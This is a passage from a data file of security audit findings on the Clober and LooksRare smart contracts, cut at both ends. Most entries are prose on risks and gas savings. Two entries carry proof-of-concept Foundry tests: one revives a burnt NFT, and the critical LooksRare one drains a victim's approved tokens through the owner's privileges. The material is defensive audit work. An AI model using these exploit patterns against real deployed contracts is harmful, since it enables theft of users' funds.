assertEq(orderToken.ownerOf(tokenId), Constants.MAKER, \"NFT_OWNER\"); // Step 3: resurrect burnt token by calling safeTransferFrom orderToken.safeTransferFrom( Constants.MAKER, attacker2, tokenId ); // verify ownership is now attacker2 assertEq(orderToken.ownerOf(tokenId), attacker2, \"NFT_OWNER\"); }", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Lack of two-step role transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The contracts lack two-step role transfer. Both the ownership of the MarketFactory as well as the change of market's host are implemented as single-step functions. The basic validation whether the address is not a zero address for a market is performed, however the case when the address receiving the role is inaccessible is not covered properly. Taking into account the handOverHost can be invoked without any supervision, by anyone who created the market it is possible to make a typo unintentionally or intentionally if the attacker wants simply to brick fees collection as currently the host affects collectFees in OrderBook (described as a separate issue). The ownership transfer in theory should be less error-prone as it should be done by DAO with great care, however still two-step role transfer should be preferable.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Atomic fees delivery susceptible to funds lockout", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The collectFees function delivers the quoteToken part of fees as well as the baseToken part of fees atomically and simultaneously to both the DAO and the host. In case a single address is for instance blacklisted (e.g. via USDC blacklist feature) or a token in a pair happens to be malicious and configured the way transfer to one of the addresses reverts it is possible to block fees delivery. 17 function collectFees() external nonReentrant { // @audit delivers both tokens atomically require(msg.sender == _host(), Errors.ACCESS); if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } function _collectFees(IERC20 token, uint256 amount) internal { // @audit delivers to both wallets uint256 daoFeeAmount = (amount * _DAO_FEE) / _FEE_PRECISION; uint256 hostFeeAmount = amount - daoFeeAmount; _transferToken(token, _daoTreasury(), daoFeeAmount); _transferToken(token, _host(), hostFeeAmount); } There are multiple cases when such situation can happen for instance: a malicious host wants to block the function for DAO to prevent collecting at least guaranteed valuable quoteToken or a hacked DAO can swap treasury to some invalid address and renounce ownership to brick collectFees across multiple markets. Taking into account the current implementation in case it is not possible to transfer tokens it is necessary to swap the problematic address, however depending on the specific case it might be not trivial.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "DAO fees potentially unavailable due to overly strict access control", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The collectFees function is guarded by an inline access control require statement condition which prevents anyone, except a host, from invoking the function. Only the host of the market is authorized to invoke, effectively deliver all collected fees, including the part of the fees belonging to the DAO. function collectFees() external nonReentrant { require(msg.sender == _host(), Errors.ACCESS); // @audit only host authorized if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } This access control is too strict and can lead to funds being locked permanently in the worst case scenario. As the host is a single point of failure in case access to the wallet is lost or is incorrectly transferred the fees for both the host and the DAO will be locked.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "OrderNFT ownership and market host transfers are done separately", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The market host is entitled to 80% of the fees collected, and is able to set the URI of the correspond- ing orderToken NFT. However, transferring the market host and the orderToken NFT is done separately. It is thus possible for a market host to transfer one but not the other.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "OrderNFTs can be renamed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OrderNFT contract's name and symbol can be changed at any time by the market host. Usually, these fields are immutable for ERC721 NFTs. There might be potential issues with off-chain indexers that cache only the original value. Furthermore, suddenly renaming tokens by a malicious market host could lead to web2 phishing attacks.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "DOSing _replaceStaleOrder() due to reverting on token transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "In the case of tokens with implemented hooks, a malicious order owner can revert on token received event thus cause a denial-of-service via _replaceStaleOrder(). The probability of such an attack is very low, because the order queue has to be full and it is unusual for tokens to implement hooks.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Total claimable bounties may exceed type(uint32).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Individual bounties are capped to type(uint32).max which is ~4.295 of a native token of 18 decimals (4.2949673e18 wei). It's possible (and likely in the case of Polygon network) for their sum to therefore exceed type(uint32).max.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Can fake market order in TakeOrder event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Market orders in Orderbook.marketOrder set the 8-th bit of options. This options value is later used in _take's TakeOrder event. However, one can call Orderbook.limitOrder with this 8-th bit set and spoof a market order event.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "_priceToIndex will revert if price is type(uint128).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Because price is type uint128, the increment will overflow first before it is casted to uint256 uint256 shiftedPrice = uint256(price + 1) << 64;", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "using block.chainid for create2 salt can be problematic if there's chain hardfork", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Using block.chainid as salt for create2 can result in inconsistency if there is a chain split event(eg. eth2 merge). This will make 2 different chains that has different chainid(one with original chain id and one with random new value). Which will result in making one of the chains not able to interact with markets, nfts properly. Also, it will make things hard to do a fork testing which changes chainid for local environment.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Use get64Unsafe() when updating claimable in take()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "get64Unsafe() can be used when fetching the stored claimable value since _getClaimableIndex() returns elementIndex < 4", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Check is zero is cheaper than check if the result is a concrete value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Checking if the result is zero vs. checking if the result is/isn't a concrete value should save 1 opcode.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Function argument can be skipped", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The address caller parameter in the internal _cancel function can be replaced with msg.sender as effectively this is the value that is actually used when the function is invoked.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Redundant flash loan balance cap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The requested flash loan amounts are checked against and capped up to the contract's token bal- ances, so the caller has to validate and handle the case where the tokens received are below the requested amounts. It would be better to optimize for the success case where there are sufficient tokens. Otherwise, let the function revert from failure to transfer the requested tokens instead.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Do direct assignment to totalBaseAmount and totalQuoteAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "While iterating through multiple claims, totalBaseAmount and totalQuoteAmount are reset and as- signed a value each iteration. Since they are only incremented in the referenced block (and are mutually exclusive cases), the assignment can be direct instead of doing an increment.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Redundant zero minusFee setter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "minusFee defaults to zero, so the explicit setting of it is redundant.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Load _FEE_PRECISION into local variable before usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Loading _FEE_PRECISION into a local variable slightly reduced bytecode size (0.017kB) and was found to be a tad more gas efficient.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Can cache value difference in SegmentedSegmentTree464.update", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The replaced - value expression in SegmentedSegmentTree464.pop is recomputed several times in each loop iteration.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unnecessary loop condition in pop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The loop variable l in SegmentedSegmentTree464.pop is an unsigned int, so the loop condition l >= 0 is always true. The reason why it still terminates is that the first layer only has group index 0 and 1, so the rightIndex.group - leftIndex.group < 4 condition is always true when the first layer is reached, and then it terminates with the break keyword.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Use same comparisons for children in heap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The pop function compares one child with a strict inequality (<) and the other with less than or equals (<=). A heap doesn't guarantee order between the children and there are no duplicate nodes (wordIndexes).", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "No need for explicit assignment with default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Explicitly assigning ZERO value (or any default value) costs gas, but is not needed.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Prefix increment is more efficient than postfix increment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The prefix increment reduces bytecode size by a little, and is slightly more gas efficient.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Tree update can be avoided for fully filled orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "For fully filled orders, remainingAmount will be 0 (openOrderAmount == claimedRawAmount), so the tree update can be skipped since the new value is the same as the old value. Hence, the code block can be moved inside the if (remainingAmount > 0) code block.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Shift msg.value cap check for earlier revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The cap check on msg.value should be shifted up to the top of the function so that failed checks will revert earlier, saving gas in these cases.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Solmate's ReentrancyGuard is more efficient than OpenZeppelin's", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Solmate's ReentrancyGuard provides the same functionality as OpenZeppelin's version, but is more efficient as it reduces the bytecode size by 0.11kB, which can be further reduced if its require statement is modified to revert with a custom error.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "r * r is more gas efficient than r ** 2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "It's more gas efficient to do r * r instead of r ** 2, saving on deployment cost.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Update childHeapIndex and shifter initial values to constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The initial values of childHeapIndex and shifter can be better hardcoded to avoid redundant operations.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Same value tree update falls under else case which will do redundant overflow check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "In the case where value and replaced are equal, it currently will fall under the else case which has an addition overflow check that isn't required in this scenario. In fact, the tree does not need to be updated at all.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unchecked code blocks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The mentioned code blocks can be performed without native math overflow / underflow checks because they have been checked to be so, or the min / max range ensures it.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unused Custom Error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "error TreeQueryIndexOrder(); is defined but unused.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Markets with malicious tokens should not be interacted with", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The Clober protocol is permissionless and allows anyone to create an orderbook for any base token. These base tokens can be malicious and interacting with these markets can lead to loss of funds in several ways. For example, a token with custom code / a callback to an arbitrary address on transfer can use the pending ETH that the victim supplied to the router and trade it for another coin. The victim will lose their ETH and then be charged a second time using their WETH approval of the router.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Claim bounty of stale orders should be given to user instead of daoTreasury", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "When an unclaimed stale order is being replaced, the claimBounty is sent to the DAO treasury. However, since the user is the one executing the claim on behalf of the stale order owner, and is paying the gas for it, the claimBounty should be sent to him instead.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Misleading comment on remainingRequestedRawAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The comment says // always ceil, but remainingRequestedRawAmount is rounded down when the base / quote amounts are converted to the raw amount.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Potential DoS if quoteUnit and index to price functions are set to unreasonable values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "There are some griefing and DoS (denial-of-service) attacks for some markets that are created with bad quoteUnit and pricing functions. 1. A market order uses _take to iterate over several price indices until the order is filled. An attacker can add a tiny amount of depth to many indices (prices), increasing the gas cost and in the worst case leading to out-of-gas transactions. 2. There can only be MAX_ORDER_SIZE (32768) different orders at a single price (index). Old orders are only replaced if the previous order at the index has been fully filled. A griefer or a market maker trying to block their competition can fill the entire order queue for a price. This requires 32768 * quoteUnit quote tokens.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Rounding rationale could be better clarified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The rationale for rounding up / down was easier to follow if tied to the expendInput option instead.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Rename flashLoan() for better composability & ease of integration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "For ease of 3rd party integration, consider renaming to flash(), as it would then have the same function sig as Uniswap V3, although the callback function would still be different.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Unsupported tokens: tokens with more than 18 decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The orderbook does currently not support tokens with more than 18 decimals. However, having more than 18 decimals is very unusual.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "ArithmeticPriceBook and GeometricPriceBook contracts should be abstract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The ArithmeticPriceBook and GeometricPriceBook contracts don't have any external functions.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "childRawIndex in OctopusHeap.pop is not a raw index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OctopusHeap uses raw and heap indices. Raw indices are 0-based (root has raw index 0) and iterate the tree top to bottom, left to right. Heap indices are 1-based (root has heap index 0) and iterate the head left to right, top to bottom, but then iterate the remaining nodes octopus arm by arm. A mapping between the raw index and heap index can be obtained through _convertRawIndexToHeapIndex. The pop function defines a childRawIndex but this variable is not a raw index, it's actually raw index + 1 (1-based). 30", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Lack of orderIndex validation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The orderIndex parameter in the OrderNFT contract is missing proper validation. Realistically the value should never exceed type(uint232).max as it is passed from the OrderBook contract, however, future changes to the code might potentially cause encoding/decoding ambiguity.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Unsafe _getParentHeapIndex, _getLeftChildHeapIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "When heapIndex = 1 _getParentHeapIndex(uint16 heapIndex) would return 0 which is an invalid heap index. when heapIndex = 45 _getLeftChildHeapIndex(uint16 heapIndex) would return 62 which is an invalid heap index.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "_priceToIndex function implemented but unused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The _priceToIndex function for the price books are implemented but unused.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Incorrect _MAX_NODES and _MAX_NODES_P descriptions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The derivation of the values _MAX_NODES and MAX_NODES_P in the comments are incorrect. For _MAX_NODES C * ((S *C) ** L-1)) = 4 * ((2 * 4) ** 3) = 2048 is missing the E, or replace S * C with N. The issue isn't entirely resolved though, as it becomes C * (S * C * E) ** (L - 1) = 4 * (2 * 4 * 2) ** 3 = 16384 or 2 ** 14 Same with _MAX_NODES_P", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "marketOrder() with expendOutput reverts with SlippageError with max tolerance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "During the audit the Clober team raised this issue. Added here to track the fixes.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Wrong OrderIndex could be emitted at Claim() event.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "During the audit the Clober team raised this issue. Added here to track the fixes.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "The Protocol owner can drain users' currency tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The Protocol owner can drain users' currency tokens that have been approved to the protocol. Makers who want to bid on NFTs would need to approve their currency token to be spent by the protocol. The owner should not be able to access these funds for free. The owner can drain the funds as follows: 1. Calls addTransferManagerForAssetType and assigns the currency token as the transferManagerForAs- setType and IERC20.transferFrom.selector as the selectorForAssetType for a new assetType. 2. Signs an almost empty MakerAsk order and sets its collection as the address of the targeted user and the assetType to the newly created assetType. The owner also creates the corresponding TakerBid by setting the recipient field to the amount of currency they would like to transfer. 3. Calls the executeTakerBid endpoint with the above data without a merkleTree or affiliate. // file: test/foundry/Attack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; contract NullStrategy is IBaseStrategy { function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function executeNull( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external pure returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) {} } 5 contract AttackTest is ProtocolBase { NullStrategy private nullStrategy; MockERC20 private mockERC20; uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); looksRareProtocol.initiateOwnershipTransfer(signingOwner); // This particular strategy is not a requirement of the exploit. nullStrategy = new NullStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, NullStrategy.executeNull.selector, false, address(nullStrategy) ); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); vm.stopPrank(); vm.prank(signingOwner); looksRareProtocol.confirmOwnershipTransfer(); } function testDrain() public { vm.prank(victimUser); mockERC20.approve(address(looksRareProtocol), 1000); vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(mockERC20), mockERC20.transferFrom.selector ); OrderStructs.MakerAsk memory makerAsk = _createSingleItemMakerAskOrder({ // null strategy askNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // ERC20 asset! orderNonce: 0, collection: victimUser, // <--- will be used as the `from` currency: address(0), signer: signingOwner, minPrice: 0, itemId: 1 }); 6 bytes memory signature = _signMakerAsk(makerAsk, signingOwnerPK); OrderStructs.TakerBid memory takerBid = OrderStructs.TakerBid( address(1000), // `amount` field for the `transferFrom` 0, makerAsk.itemIds, makerAsk.amounts, bytes(\"\") ); looksRareProtocol.executeTakerBid( takerBid, makerAsk, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); vm.stopPrank(); assertEq(mockERC20.balanceOf(signingOwner), 1000); assertEq(mockERC20.balanceOf(victimUser), 0); } }", "labels": ["Spearbit", "LooksRare", "Severity: Critical Risk"]}, {"title": "StrategyFloorFromChainlink will often revert due to stale prices", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The FloorFromChainlink strategy inherits from BaseStrategyChainlinkPriceLatency, so it can have a maxLatency of at most 3600 seconds. However, all of the chainlink mainnet floor price feeds have a heartbeat of 86400 seconds (24 hours), so the chainlink strategies will revert with the PriceNotRecentEnough error quite often. At the time of writing, every single mainnet floor price feed has an updateAt timestamp well over 3600 seconds in the past, meaning the strategy would always revert for any mainnet price feed right now. This may have not been realized earlier because the Goerli floor price feeds do have a heartbeat of 3600, but the mainnet heartbeat is much less frequent. One of the consequences is that users might miss out on exchanges they would have accepted. For example, if a taker bid is interested in a maker ask with an eth premium from the floor, in the likely scenario where the taker didn't log-in within 1 hour of the last oracle update, the strategy will revert and the exchange won't happen even though both parties are willing. If the floor moves up again the taker might not be interested anymore. The maker will have lost out on making a premium from the floor, and the taker would have lost out on the exchange they were willing to make.", "labels": ["Spearbit", "LooksRare", "Severity: Medium Risk"]}, {"title": "minPrice and maxPrice should reflect the allowed regions for the funds to be transferred from the bidder to the ask recipient", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "1. When a maker or taker sets a minPrice for an ask, the protocol should guarantee the funds they receive is at minimum the minPrice amount (currently not enforced). 2. Also reversely, when a maker or taker sets a maxPrice for a bid, the protocol should guarantee that the amount they spend is at maximum maxPrice (currently enforced). For 1. the current protocol-controlled deviation can be 30% maximum (sum of fees sent to the creator, the protocol fee recipient, and an affiliate).", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "StrategyItemIdsRange does not invalidate makerBid.amounts[0] == 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyItemIdsRange does not check whether makerBid.amounts[0] is zero or not. If it was 0, the taker can provide empty itemIds and amounts which will cause the for loop to be skipped. The check below will also be successful since both amounts are 0: if (totalOfferedAmount != desiredAmount) { revert OrderInvalid(); } Depending on the used implementation of a transfer manager for the asset type used in this order, we might end up with the taker taking funds from the maker without providing any NFT tokens. The current implementation of TransferManager does check whether the provided itemIds have length 0 and it would revert in that case. One difference between this strategy and others are that all strategies including this one do check to revert if an amount for a specific itemId is 0 (and some of them have loops but the length of those loops depends on the parameters from the maker which enforce the loop to run at least once), but for this strategy if no itemIds are provided by the taker, the loop is skipped and one does not check whether the aggregated amount is 0 or not.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "TransferManager's owner can block token transfers for LooksRareProtocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In general, a deployed TransferManager ( T ) and a deployed LooksRareProtocol ( L ) might have two different owners ( OT , OL ). Assume TransferManager is used for asset types 0 and 1 (ERC721, ERC1155) in LooksRareProtocol and Trans- ferManager has marked the LooksRareProtocol as an allowed operator. At any point, OT can call removeOpera- tor to block L from calling T . If that happens, OL would need to add new (virtual) asset types (not 0 or 1) and the corresponding transfer managers for them. Makers would need to resign their orders with new asset types. Moreover, if LooksRare for the following issue \"The Protocol owner can drain users' currency tokens\" applies their solution through PR 308 which removes the ability of OL to add new asset types, then the whole protocol would need to be redeployed, since all order executions would revert.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token. If an operator (approved by a user) sends a 0 amount for an itemId in the context of transferring ERC721 token, TransferManager would perform those transfers, even though the logic in the operator might have meant to avoid those transfers.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The maker cannot enforce the number of times a specific order can be fulfilled for custom strategies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a maker signs an order with a specific strategy it leaves it up to the strategy to decide how many times this specific order can be fulfilled. The strategy's logic on how to decide on the returned isNonceIn- validated value, can be a complex logic in general that might be prone to errors (or have backdoors). The maker should be able to directly enforce at least an upper bound for the maximum number of fulfills for an order to avoid unexpected expenditure.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "A strategy can potentially reduce the value of a token before it gets transferred to a maker when a taker calls executeTakerAsk", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When executeTakerAsk is called by a taker a (signed by maker) strategy will be called: (bool status, bytes memory data) = strategyInfo[makerBid.strategyId].implementation.call( abi.encodeWithSelector(strategyInfo[makerBid.strategyId].selector, takerAsk, makerBid) ); Note that this is a stateful call. This call is performed before the NFT token is transferred to the maker (signer). Even though the strategy is fixed by the maker (since the stratgeyId has been signed), the strategy's implementation might involve a complex logic that might allow (if the strategy colludes with the taker somehow) a derivative token (that is owned by / linked to the to-be-transferred token) to be reattached to another token (think of accessories for an NFT character token in a game). And so the value of the to-be-transferred token would be reduced in that sense. A maker would not be able to check for this linked derivative token ownership during the transaction since there is no post-transfer hook for the maker (except in one special case when the token involved is ERC1155 and the maker is a custom contract). Also, note that all the implemented strategies would not alter the state when they are called (their endpoints have a pure or a view visibility). There is an exception to this in the StrategyTestMultiFillCollectionOrder test contract.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "An added transfer manager cannot get deactivated from the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Once a transfer manager for an asset type gets added to the protocol either through the constructor or through addTransferManagerForAssetType, if at some point there is a malicious behavior involved with the transfer manager, there is no mechanism for the protocol's owner to deactivate the transfer manager (similar to how strategies can be deactivated). If TransferManager is used for an asset type, on the TransferManager side the owner can break the link between the operator (the LooksRare protocol potentially) and the TransferManager but not the other way around.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Temporary DoS is possible in case orders are using tokens with blacklists", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the process of settling orders, _transferFungibleTokens is being called at max 4 times. In case one of these calls fails the entire transaction fails. It can only fail when an ERC20 token is used for the trade but since contracts are whitelisted in the system and probably vetted by the team, it's safe to say it's less probable that the receiver will have the ability to revert the entire transaction, although it is possible for contracts that implement a transferAndCall pattern. However, there's still the issue of transactions being reverted due to blacklistings (which have become more popular in the last year). In order to better assess the risk let's elaborate more on the 4 potential recipients of a transaction: 1. affiliate - The risk can be easily mitigated by proper handling at the front-end level. If the transaction fails due to the affiliate's address, the taker can specify address(0) as the affiliate. 2. recipient - If the transaction fails due to the recipient's address, it can only impact the taker in a gas-griefing way. 3. protocol - If the transaction fails due to the protocol's address, its address might be updated by the contract owner in the worst case. 4. creator - If the transaction fails due to the creator's address it can not be changed directly, but in the worst case creatorFeeManager can be changed.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "viewCreatorFeeInfo's reversion depends on order of successful calls to collection.royaltyInfo", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The outcome of the call to viewCreatorFeeInfo for both CreatorFeeManagerWithRebates and Cre- atorFeeManagerWithRoyalties is dependent on the order of itemIds. Assume, we have 2 itemIds with the following properties:  itemId x where the call to collection.royaltyInfo(x, price) is successful (status == 1) and returns (a, ...) where a 6= 0.  itemId y where the call to collection.royaltyInfo(y, price) fails (status == 0) Then if itemIds provided to viewCreatorFeeInfo is:  [x, y], the call to viewCreatorFeeInfo returns successfully as the 